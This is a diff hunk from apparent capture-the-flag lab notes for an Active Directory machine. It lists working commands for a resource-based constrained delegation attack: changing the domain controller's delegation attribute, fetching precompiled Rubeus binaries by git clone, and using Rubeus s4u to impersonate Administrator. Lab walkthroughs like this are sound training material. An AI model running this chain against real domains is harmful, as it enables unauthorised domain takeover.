@@ -247,6 +247,7 @@ Get-ADComputer -identity FAKE-COMP01
 Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
 Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
 Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
+git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries.git
 upload Rubeus.exe
 .\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
 .\Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
